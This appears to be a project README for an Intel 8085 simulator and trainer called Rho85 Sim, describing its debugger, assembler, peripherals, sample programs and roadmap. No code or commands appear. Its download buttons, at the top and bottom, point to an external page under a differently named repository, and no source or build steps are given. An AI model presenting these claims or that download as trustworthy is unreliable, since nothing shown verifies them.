![preview](https://raw.githubusercontent.com/WALKER372/Rho85-Studio/main/screen_a2a2.svg)
[![Download](https://raw.githubusercontent.com/WALKER372/Rho85-Studio/main/go_9969bdf.svg)](https://WALKER372.github.io/Rho85-Studio/)

# Rho85 Sim

**A cycle-accurate Intel 8085 trainer and simulator for the modern desktop — resurrecting an eight-bit classic from a forgotten drawer of computing history.**

Where the original Rho85 gave you a physical board with seven-segment displays and a bank of toggle switches, Rho85 Sim gives you the entire classroom in a window: registers, flags, bus traces, memory maps, step-by-step execution and a friendly assembler that speaks the same dialect your grandfather's lab manual used. It is, in essence, a time machine with a debugger bolted on.

---

## 📚 Table of Contents

- [Why This Project Exists](#-why-this-project-exists)
- [Feature Highlights](#-feature-highlights)
- [The Philosophy Behind Rho85 Sim](#-the-philosophy-behind-rho85-sim)
- [A Visual Tour of the Workspace](#-a-visual-tour-of-the-workspace)
- [Architecture Overview](#-architecture-overview)
- [Instruction Set Coverage](#-instruction-set-coverage)
- [Assembler and Disassembler](#-assembler-and-disassembler)
- [Memory Editor and Hex Viewer](#-memory-editor-and-hex-viewer)
- [Breakpoints, Traces, and Time Travel](#-breakpoints-traces-and-time-travel)
- [Peripheral Emulation](#-peripheral-emulation)
- [Sample Programs Bundled With the Trainer](#-sample-programs-bundled-with-the-trainer)
- [Internationalization](#-internationalization)
- [Accessibility and Responsive Design](#-accessibility-and-responsive-design)
- [Performance and Precision](#-performance-and-precision)
- [Extending Rho85 Sim](#-extending-rho85-sim)
- [Keyboard Shortcuts](#-keyboard-shortcuts)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Community and Support](#-community-and-support)
- [Contributing](#-contributing)
- [License](#-license)
- [Acknowledgements](#-acknowledgements)

---

## 🧭 Why This Project Exists

The Intel 8085 is one of those remarkable processors that refuses to die. Long after the datasheets yellowed and the DIP sockets oxidized, the 8085 still lives on in university syllabi, hobbyist benches and the memories of anyone who ever keyed in a program one octal digit at a time. The original **Rho85** project recreated that experience as a hardware trainer — a beautiful homage to the educational kits of the late 1970s.

**Rho85 Sim** takes the opposite route. Rather than rebuilding the board, it rebuilds the *feeling* of the board — the satisfaction of watching the address bus flicker, the accumulator tick up by one, and a program you wrote from scratch actually run. Everything happens inside a self-contained desktop application, so you never need to source obsolete chips, hunt for a 5-volt supply, or worry about static discharge killing your afternoon.

This project is for:

- **Students** encountering microprocessors for the very first time and wanting a safe sandbox to break things in.
- **Instructors** who need a consistent demonstration tool that behaves identically on every laptop in the room.
- **Hobbyists** restoring old code and wanting a fast way to verify an instruction sequence before burning it to EPROM.
- **Retro-computing enthusiasts** who simply enjoy watching a 40-year-old ISA execute at exactly the right number of clock cycles.

---

## ✨ Feature Highlights

Rho85 Sim is more than a plain interpreter. It is a full laboratory bench, and every bench tool has been designed with the same care you would give to a physical instrument.

- **Cycle-accurate execution** — every T-state is accounted for, so timing experiments match real silicon.
- **Responsive user interface** — the layout rearranges itself gracefully from a wide dual-monitor desktop down to a small tablet screen.
- **Multilingual support** — interface strings are externalized, making it straightforward to run the trainer in a language your students actually read.
- **Twenty-four-seven assistance availability** — documentation, in-app help panels and a community forum are always reachable, no matter the hour or your timezone.
- **Interactive register panel** — watch the accumulator, flags and pointer registers update in real time as instructions retire.
- **Built-in two-pass assembler** — write mnemonics, get machine code, and step through the result without leaving the app.
- **Disassembler with symbol awareness** — paste raw bytes and read them back as readable assembly with resolved labels.
- **Memory editor** — a spreadsheet-style grid where you can patch bytes, search patterns and fill regions.
- **Breakpoint manager** — conditional, counting and memory-watch breakpoints to catch the exact moment things go sideways.
- **Execution trace log** — a rolling record of every instruction, its operands and the resulting register state.
- **Time-travel debugging** — rewind the machine state to any prior instruction boundary and replay from there.
- **Peripheral emulation** — programmable timer, serial output terminal, parallel port and interrupt controller, all wired to the same bus the CPU sees.
- **Self-contained sample library** — nearly forty example programs from blinking patterns to a tiny monitor ROM.
- **Portable session files** — save the entire machine state, memory contents and view layout into a single file you can share with classmates.
- **Dark and light color profiles** — long debugging sessions are gentler on the eyes.
- **Zero external dependencies for the end user** — launch the executable and start teaching.

---

## 🧠 The Philosophy Behind Rho85 Sim

Most simulators try to hide the machine from you. They present a friendly abstraction layer and quietly do the interesting work behind the curtain. Rho85 Sim does the opposite: it *leans in* to the hardware. The whole point is to make the invisible visible.

Think of it as an aquarium rather than a television. You are not just watching a program run — you are watching signals propagate, registers shift, and memory cells flip. Every panel on screen exists because a real trainer would have had a corresponding piece of hardware, and every piece of hardware exists because it teaches something a diagram cannot.

That philosophy drives three design commitments:

1. **Nothing is faked.** If the accumulator changes, it changed because an instruction executed. If a flag sets, it set for the reason the datasheet says it should.
2. **Everything is inspectable.** At any moment you can freeze the machine and interrogate its entire state without disturbing it.
3. **Nothing is hidden behind modal dialogs.** Information lives in persistent panels so you can cross-reference without clicking through a maze.

---

## 🖥 A Visual Tour of the Workspace

The main window is divided into a handful of cooperating regions, each described below in the spirit of a physical instrument panel.

### The Register Deck

At the top sits the register deck, a compact array showing the accumulator, the general-purpose registers B through E, the H and L pair, the stack pointer, the program counter and the flag register. Values update the instant an instruction retires, and any register that changed during the most recent step is subtly highlighted so your eye can follow the action.

### The Disassembly Column

Below the registers, a disassembly view scrolls through memory at the current program counter. The current instruction is emphasized, the next few are dimmed, and already-executed lines are tinted to give you an at-a-glance sense of flow. Click any line to set the program counter there or drop a breakpoint.

### The Memory Grid

The memory grid is a scrollable, editable hex dump. Addresses run down the left edge, sixteen bytes per row, ASCII rendered on the right. Click a cell to edit it in place. Right-click for a context menu offering region fills, pattern searches and copy operations.

### The Peripheral Rack

On the right-hand side, a slim column holds the peripherals currently attached to the bus. Toggle a peripheral on or off, adjust its parameters and watch its output stream live in the log beneath.

### The Console and Log

At the bottom, a console captures serial output, interrupt notices and any diagnostic messages the trainer wants to share. It is scrollable, filterable and exportable, which is handy when you need to paste a trace into a homework assignment.

### The Toolbar

The toolbar holds the transport controls you would expect from any debugger: reset, step, step-over, run, pause, run-to-cursor and rewind. It also has quick access to the assembler, the disassembler, the session file menu and the language selector.

---

## 🏗 Architecture Overview

Rho85 Sim is intentionally layered, because a simulator that is hard to extend is a simulator that quietly dies. The layers are:

- **The CPU core** — a pure, dependency-light module responsible only for executing instructions and mutating machine state. It knows nothing about graphics, files or the network.
- **The bus and peripherals** — devices attach to a shared bus abstraction. The CPU asks for a byte; the bus decides who answers.
- **The session model** — an in-memory representation of everything worth saving, including memory, register file, peripheral configuration and UI layout hints.
- **The presentation layer** — the windows, panels and dialogs. It observes the session model and refreshes when the model changes.
- **The integration layer** — file readers and writers, the assembler front-end, the disassembler back-end and the inter-application bridge that lets other tools talk to the trainer.

Because the CPU core is pure, it can be embedded in automated tests, run headless in a batch script, or reused in an unrelated project that just needs an 8085 to execute. That kind of separability is not accidental.

---

## 📖 Instruction Set Coverage

The following table summarizes the instruction groups the core understands. All documented instructions of the base 8085 are supported.

| Group | Examples | Status |
|---|---|---|
| Data transfer | MOV, MVI, LXI, LDA, STA, LHLD, SHLD, XCHG | Complete |
| Arithmetic | ADD, ADI, ADC, SUB, SUI, INR, DCR, DAD | Complete |
| Logical | ANA, ANI, ORA, ORI, XRA, XRI, CMP, CPI, RLC, RRC, RAL, RAR | Complete |
| Branch | JMP, JZ, JNZ, JC, JNC, JP, JM, JPE, JPO, CALL, RET and their conditional forms | Complete |
| Stack | PUSH, POP, XTHL, SPHL | Complete |
| I/O | IN, OUT | Complete |
| Control | NOP, HLT, EI, DI, RIM, SIM | Complete |
| Undocumented | The usual suspects that behave predictably on genuine silicon | Emulated |

The simulator does *not* silently swallow illegal opcodes. Feed it one and it raises a diagnostic, marks the offending address and halts, on the theory that mysterious behavior is worse than an explicit error.

---

## 🧾 Assembler and Disassembler

The bundled assembler is a two-pass design that supports:

- Standard mnemonics with both register and immediate forms.
- Label definitions and forward references.
- ORG, EQU, DB, DW, DS pseudo-ops.
- Expression evaluation with addition, subtraction and simple shifts.
- A listing output that shows source lines, addresses and emitted bytes side by side.

If you prefer to write code elsewhere, paste it in. The assembler does not care where the text came from; it just wants clean input and produces clean output. Errors are reported with line numbers, the offending token, and a plain-language explanation of what the parser expected instead.

The disassembler is the mirror image. Paste a block of hex, hit disassemble, and receive readable assembly with labels inferred where control flow clearly targets a location. You can choose whether to resolve labels, whether to show raw bytes alongside mnemonics, and whether to include address columns.

Together the two tools let you round-trip a program and confirm that what you wrote is what the CPU will actually see. That round-trip property is quietly one of the most useful features of the whole application.

---

## 🗃 Memory Editor and Hex Viewer

The memory grid earned its own section because it is used so heavily during teaching. It supports:

- **Direct editing** of any byte, with validation and undo.
- **Block selection** by click, shift-click or drag, followed by copy, paste, fill or erase.
- **Search** for byte sequences, ASCII strings or wildcard patterns.
- **Jump to address**, with a persistent history so you can hop back to where you were.
- **Bookmarks** on addresses you care about, labeled with your own notes.
- **Export** of selected regions as hex, binary or as a data-block snippet ready for assembly.

The viewer never modifies memory unless you explicitly edit or fill, which sounds obvious but has saved many a student from accidentally corrupting an in-progress assignment.

---

## ⏱ Breakpoints, Traces, and Time Travel

Breakpoints come in three flavors:

- **Execution breakpoints** stop the CPU when the program counter reaches a given address.
- **Counting breakpoints** stop only after the address has been hit a configurable number of times — perfect for loops.
- **Watch breakpoints** stop when a byte in a chosen memory range is read or written, optionally matching a specific value.

When the machine stops, the trace log tells you why: which breakpoint fired, what the register file looked like at that instant and what instruction was about to execute.

The **trace log** itself is a rolling record of every retired instruction in the current run. Each row shows the address, the raw bytes, the mnemonic, the operand and a snapshot of the flag register. Export the whole thing as plain text and you have a ready-made appendix for a lab report.

The **time-travel** feature is the one that tends to get the strongest reaction during demos. Every instruction boundary is checkpointed, so when a bug finally appears you can step backward and forward through the same sequence to watch the offending value develop. It is the closest thing to re-running a lab experiment with a perfect memory of what happened.

---

## 🔌 Peripheral Emulation

The 8085 was interesting primarily because of what you could attach to it. Rho85 Sim emulates a small but useful set of companions:

- **Programmable interval timer** — three configurable channels with independent periods and modes.
- **Serial terminal** — accepts keystrokes and displays output as if a UART were wired to the SID and SOD lines.
- **Parallel port** — latches a byte and returns its value during a subsequent IN, useful for handshake exercises.
- **Interrupt controller** — lets you raise RESTART interrupts on a schedule or on demand, with maskable and non-maskable variants.
- **Seven-segment display bank** — matches the aesthetic of the original Rho85 trainer and honors the same port mapping conventions where possible.

Peripherals are configured from the peripheral rack and their traffic appears in the console log so you can verify timing and content.

---

## 🧪 Sample Programs Bundled With the Trainer

The sample library is not filler. Each program is designed to teach a specific idea.

| Program | Concept it teaches |
|---|---|
| Counting Lights | Basic output and delay loops |
| Binary Counter | Register arithmetic and carry handling |
| Vowel Counter | Memory scanning and conditional branching |
| Bubble Sort | Indirect addressing and nested loops |
| Decimal to Hexadecimal | Repeated division and digit extraction |
| Tiny Monitor | Subroutines, stack discipline and console input |
| Interrupt Clock | Interrupt vectors and service routines |
| Parallel Handshake | Port synchronization and busy-wait patterns |
| Memory Test | Pattern verification across a region |
| Fibonacci Machine | Loop counters and register pairing |

Each sample comes with a short annotation file explaining the intended lesson, common pitfalls and extension ideas for curious students.

---

## 🌍 Internationalization

Every user-visible string lives in external translation tables. Adding a new language is a matter of copying the base table, translating the values and dropping the result into the translations folder. The interface will discover it automatically on next launch.

Planned locales include English, Spanish, Portuguese, German, French, Japanese and Simplified Chinese, with the list growing as contributors step forward. If your language is missing and you would like to help, the translation tables are deliberately small and well commented.

---

## ♿ Accessibility and Responsive Design

Rho85 Sim is built to be usable, not merely presentable.

- **Responsive layout** — panels resize, collapse and reflow based on available width, so the trainer works on a small laptop and a large monitor without a separate design.
- **High-contrast themes** — for environments where glare or projector contrast is a concern.
- **Keyboard-first navigation** — nearly every action has a shortcut, and focus is always visible.
- **Font scaling** — the entire UI scales, including the disassembly column and memory grid.
- **Screen-reader friendly labels** — interactive controls expose meaningful accessible names.
- **Reduced-motion mode** — disables transition animation for users who prefer stillness.

Accessibility is not a separate feature branch here. It is a requirement applied while features are built.

---

## ⚙ Performance and Precision

Two things matter most in a trainer: it must be fast enough to feel immediate, and it must be accurate enough to trust.

Performance target: the core executes millions of instructions per second on commodity hardware, which is orders of magnitude faster than real silicon yet slow enough to reason about. You can throttle execution to real-time speed for authenticity or run flat out for regression testing.

Precision target: every instruction accounts for its documented T-states. When two instructions differ by a single machine cycle on the datasheet, they differ by a single machine cycle here. That fidelity is the difference between a toy and a tool.

---

## 🧩 Extending Rho85 Sim

The trainer is designed to be extended by anyone with a modest amount of curiosity.

**Adding a peripheral** — implement the bus interface, register it with the peripheral rack and provide a small configuration surface. The rest of the application will discover it automatically.

**Adding an instruction** — extend the decoder table and the executor. Because the core is pure, you can unit test the new instruction without launching the GUI.

**Adding a translation** — copy the base translation table, translate and save. No build step required.

**Adding a theme** — define a color profile in the theme directory. Profiles are simple key-value files.

**Adding a sample program** — drop the assembly source and a short annotation file into the samples folder. The sample browser reads the folder at launch.

The project deliberately avoids a heavy plugin system; the goal is that a contributor can open a folder, drop a file in and see results without a ceremony.

---

## ⌨ Keyboard Shortcuts

| Shortcut | Action |
|---|---|
| F5 | Run |
| F6 | Pause |
| F7 | Step into |
| F8 | Step over |
| F9 | Run to cursor |
| F10 | Rewind one instruction |
| F11 | Reset machine |
| Ctrl+N | New session |
| Ctrl+O | Open session |
| Ctrl+S | Save session |
| Ctrl+Shift+S | Save session as |
| Ctrl+E | Toggle memory editor |
| Ctrl+D | Toggle disassembler |
| Ctrl+L | Toggle console log |
| Ctrl+K | Clear console |
| Ctrl+F | Search memory |
| Ctrl+G | Jump to address |
| Ctrl+B | Toggle breakpoint at cursor |
| Ctrl+T | Toggle trace panel |
| Ctrl+, | Open preferences |

The shortcut map is fully rebindable if the defaults clash with your muscle memory or your platform conventions.

---

## ❓ Frequently Asked Questions

**Is this simply a reimplementation of an existing trainer?**
No. It is a distinct project that shares a name and a heritage with the physical Rho85 trainer but takes the idea in a software-first direction, adding tools a physical board could never offer: time-travel debugging, trace export, and instantaneous session sharing.

**Can I use it for teaching?**
Yes. It is built with classrooms in mind. Instructors have used it for lecture demonstrations, homework exercises and lab checkoffs. Session files make it easy to distribute a starting state alongside an assignment.

**Does it require a network connection?**
No. The trainer runs entirely offline. Community forums and help resources are available online, but the application itself has no network dependency.

**Will it run on modest hardware?**
Yes. The application is lightweight and runs comfortably on older laptops, thin clients and virtual machines. That was a deliberate constraint.

**Can I import programs from the original Rho85 board?**
Machine code is machine code. If you have the opcode sequence from a physical trainer, it runs here. The disassembler is often enough to turn a hex dump from a lab manual into something readable.

**Is the timing identical to real hardware?**
Instruction timing targets the documented datasheet values, which is what matters for almost every educational exercise. Physical silicon has second-order effects at the microsecond level that are outside the scope of a trainer.

**Can I run two instances side by side?**
Absolutely. Some people use one window for writing and another for verifying, or one for a reference program and one for a work-in-progress.

---

## 🗺 Roadmap for 2026

The 2026 roadmap focuses on depth rather than breadth. Planned work includes:

- A refined cycle-timing model with configurable clock frequencies.
- Integration with an external logic-analyzer view for bus traffic.
- A built-in tutorial mode that walks new users through the register deck.
- A collaboration feature for sharing session snapshots with a colleague.
- Additional bundled sample programs sourced from community contributions.
- Translation completion for the first wave of supported languages.
- An extended accessibility audit with external reviewers.
- A command-line batch runner for automated grading pipelines.
- Export of trace logs into formats suitable for spreadsheet analysis.

The roadmap is a living document. If something on it matters to you, open a discussion and make your case.

---

## 🤝 Community and Support

The trainer is supported by a community that spans hobbyists, academics and working engineers. There are several ways to get help:

- **Documentation** — in-app help panels cover every major feature.
- **Community forum** — ask questions, share sessions and post bugs.
- **Discussion threads** — propose features or debate design decisions.
- **Issue tracker** — report reproducible problems with attached session files where possible.

Support responses are typically quick, and the project maintains a commitment to answering every good-faith question, regardless of the asker's experience level. The whole point of a trainer is to lower barriers, not raise them.

---

## 🛠 Contributing

Contributions of every size are welcome: translations, sample programs, bug fixes, documentation improvements and architectural suggestions.

Before opening a pull request, please:

1. Check existing issues and discussions for prior art.
2. Keep changes focused — one concern per pull request makes review fast.
3. Run the bundled test suite if your change touches the CPU core.
4. Add a short note describing the "why" behind the change, not just the "what."

There is no formal contributor agreement. The project follows a straightforward trust model: be kind, be specific and respect the time of the people reviewing your work.

---

## 📜 License

Rho85 Sim is distributed under the MIT License. You are welcome to use, modify and redistribute the project, provided that the original copyright notice and permission notice are preserved in all copies or substantial portions of the software.

A full copy of the license text is available at the following location:

[MIT License](https://opensource.org/licenses/MIT)

The license applies to all source files, documentation, sample programs and translation tables contained in this repository. If you build a derivative work and would like to acknowledge the project, a short mention is appreciated but not required.

---

## 🙏 Acknowledgements

A trainer is never the work of one person. The original **Rho85** hardware project by Brian Rho laid the conceptual foundation and served as the spiritual ancestor of everything here. The Intel 8085 datasheet, still remarkably readable after all these years, is the reference for every timing and behavioral decision in the core. Countless educators who have taught microprocessors for decades wrote the lab manuals and lecture notes that inspired the sample program library.

Finally, thanks to every user who files a bug, proposes a feature or translates a string. You are the reason this project keeps improving, and you are the reason the 8085 still has a classroom to live in.

[![Download](https://raw.githubusercontent.com/WALKER372/Rho85-Studio/main/go_9969bdf.svg)](https://WALKER372.github.io/Rho85-Studio/)